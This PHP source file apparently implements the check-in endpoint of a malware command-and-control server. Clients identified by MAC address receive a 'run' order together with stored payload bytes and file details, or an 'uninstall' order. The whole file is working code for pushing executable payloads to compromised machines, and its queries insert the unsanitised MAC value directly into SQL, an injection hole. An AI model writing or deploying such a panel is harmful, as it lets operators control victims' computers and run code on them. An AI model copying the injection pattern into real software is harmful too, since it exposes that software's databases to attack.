<?php

include('../database/db-config.php');
include('../database/db-conn.php');

function GetPayload($conn, $mac)
{
    $sql = "SELECT `payloads`.`PayloadBytes`,`payloads`.`FileName`,`payloads`.`Extension` FROM 
    `clients`, `command`,`payloads` WHERE 
    `clients`.`Id` = `command`.`Client_Id` AND 
    `command`.`StubId` = `payloads`.`Id` AND 
    `clients`.`MacAddr` = '$mac'";

    $stmt = $conn->prepare($sql);

    $stmt->execute();
    
    $result = $stmt->setFetchMode(PDO::FETCH_ASSOC);
    if($result)
    {
        $payloads = $stmt->fetchAll();    
        return $payloads;
    }
}

function GetClientId($conn, $mac)
{
    $sql = "SELECT `Id` FROM `clients` WHERE `MacAddr` = '$mac'";
    $stmt = $conn->prepare($sql);
    $stmt->execute();
    
    $result = $stmt->setFetchMode(PDO::FETCH_ASSOC);
    if($result)
    {
        $clients = $stmt->fetchAll();    
        return $clients;
    }
}

function GetCommand($conn, $id)
{
    $sql = "SELECT `Command`, `StubId` FROM `command` WHERE `command`.`Client_Id` = " .$id;
    $stmt = $conn->prepare($sql);
    $stmt->execute();
    
    $result = $stmt->setFetchMode(PDO::FETCH_ASSOC);
    if($result)
    {
        $command = $stmt->fetchAll();    
        return $command;
    }
    else
    {
        return null;
    }
}

$mac = $_POST['mac'];
$id = GetclientId($dbconn, $mac)[0]["Id"];
$command = GetCommand($dbconn, $id);

if($command == null)
{
    $commandarray = array('Message' => 'None');
    echo(json_encode($commandarray));
    die();
}



if($command[0]["Command"] == "run")
{
    $commandarray = array('Command' => 'run', 'Payload' => GetPayload($dbconn, $mac)[0] );

    echo(json_encode($commandarray));
    die();
}
else if($command[0]["Command"] == "uninstall")
{
    $commandarray = array('Command' => 'uninstall');

    echo(json_encode($commandarray));
    die();
}





?>